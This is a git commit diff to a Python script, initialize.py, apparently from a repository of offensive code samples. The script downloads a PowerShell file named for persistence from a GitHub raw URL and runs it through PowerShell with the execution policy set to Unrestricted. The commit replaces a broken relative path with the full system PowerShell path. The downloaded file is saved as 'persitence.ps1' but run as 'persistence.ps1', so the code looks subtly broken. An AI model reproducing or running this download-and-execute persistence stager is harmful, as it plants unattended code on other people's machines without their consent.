dfc6975f3c52703724105303be83aabce874b68e
Acrasy <sai.whocares@gmail.com>
2019-10-10 13:48:49 +0200

    i am not good with absolute paths

--- codesamples/initialize/code/initialize.py
+++ codesamples/initialize/code/initialize.py
@@ -7,5 +7,4 @@ os.mkdir(cwd)
 os.chdir(cwd)
 wget.download('https://raw.githubusercontent.com/Acrasy/samples/master/codesamples/initialize/code/persitence.ps1')
 
-excuteF=os.path.join(cwd,"powershell.exe")
-psexectaskscheduler = subprocess.Popen([r'executF','-ExecutionPolicy','Unrestricted','./persistence.ps1'])
+psexectaskscheduler = subprocess.Popen([r'C:\WINDOWS\system32\WindowsPowerShell\v1.0\powershell.exe','-ExecutionPolicy','Unrestricted','./persistence.ps1'])
